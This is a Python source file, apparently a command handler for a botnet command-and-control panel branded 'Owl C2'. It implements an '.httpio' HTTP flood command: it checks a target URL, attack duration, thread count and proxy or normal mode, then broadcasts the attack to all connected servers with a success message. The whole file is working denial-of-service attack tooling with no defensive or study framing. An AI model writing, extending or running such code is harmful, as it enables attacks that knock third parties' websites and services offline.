import time
import src.Commands.slot_handler as slot_handler

def httpio(args, validate_time, send, client, ansi_clear, broadcast, data,mxtime):
    from src.cnc import gradientText

    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]
        if validate_time(secs,mxtime):
            if threadx <= maxThreads and threadx > 0:
                if attackType.lower() in ['proxy', 'normal']:
                    time.sleep(1)
                    send(client, gradientText(f"\nAttack successfully sent to all Owl C2 Servers!\n", (147, 103, 176), (189, 174, 199)))
                    broadcast(data)
                    slot_handler.set_attack(int(secs))
                else:
                    send(client, gradientText('\nInvalid attack type (PROXY, NORMAL)\n', (255,0,0), (255,100,100)))
            else:
              send(client, gradientText('\nInvalid threads (1-100 threads)\n', (255,0,0), (255,100,100)))  
        else:
            send(client, gradientText('\nInvalid attack duration (1-1200 seconds)\n', (255,0,0), (255,100,100)))
    else:
        send(client, gradientText('\nUsage: .httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n', (147, 103, 176), (189, 174, 199)))